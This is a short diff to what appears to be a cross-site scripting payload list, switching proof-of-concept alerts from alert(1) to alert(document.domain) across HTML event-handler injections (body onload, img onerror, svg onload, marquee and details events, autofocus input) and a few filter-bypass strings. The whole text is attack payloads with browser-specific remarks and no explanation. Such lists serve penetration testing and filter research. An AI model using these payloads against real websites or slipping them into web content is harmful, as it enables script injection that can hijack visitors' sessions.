@@ -1,13 +1,13 @@
-<body onload=alert(1)>
-<img src=x onerror=alert()>         
-<svg onload=alert()>                   
-<body onpageshow=alert(1)>
+<body onload=alert(document.domain)>
+<img src=x onerror=alert(document.domain)>         
+<svg onload=alert(document.domain)>                   
+<body onpageshow=alert(document.domain)>
 <div style="width:1000px;height:1000px" onmouseover=alert()></div>
 <marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)
-<marquee onstart=alert(1)> (firefox only)
-<marquee loop=1 width=0 onfinish=alert(1)> (firefox only)
-<input autofocus="" onfocus=alert(1)></input>
-<details open ontoggle="alert(1)">  (chrome & opera only)
+<marquee onstart=alert(document.domain)> (firefox only)
+<marquee loop=1 width=0 onfinish=alert(document.domain)> (firefox only)
+<input autofocus="" onfocus=alert(document.domain)></input>
+<details open ontoggle="alert(document.domain)">  (chrome & opera only)
 '|alert('1')|'
 
 <Brute Data-Spy=scroll Data-Target='<Svg OnLoad=(confirm)(1)>'>
